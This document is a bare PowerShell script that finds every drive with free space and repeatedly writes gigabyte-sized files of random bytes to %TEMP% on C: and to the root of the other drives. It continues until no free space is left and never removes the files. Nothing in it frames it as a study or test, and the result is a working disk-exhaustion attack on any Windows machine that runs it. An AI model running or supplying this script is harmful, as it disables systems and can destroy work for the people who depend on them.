$drives = Get-WmiObject -Class Win32_LogicalDisk | Where-Object { $_.FreeSpace }

foreach ($drive in $drives) {
  if ($drive.DeviceID -eq "C:") {
    $path = $env:TEMP
  }
  else {
    $path = $drive.DeviceID
  }

  while (1) {
    $free = (Get-WmiObject -Class Win32_LogicalDisk | Where-Object { $_.DeviceID -eq $drive.DeviceID }).FreeSpace
    if ($free -eq 0) {
      break
    }
    else {
      if ($free -cge 1000000000) {
        $bytes = 1000000000
      }
      else {
        $bytes = $free
      }
    }

    [System.Security.Cryptography.RNGCryptoServiceProvider] $rng = New-Object System.Security.Cryptography.RNGCryptoServiceProvider
    $rndbytes = New-Object byte[] $bytes
    $rng.GetBytes($rndbytes)
    $filename = [System.IO.Path]::GetRandomFileName()
    [System.IO.File]::WriteAllBytes("$path\$filename", $rndbytes)
  }
}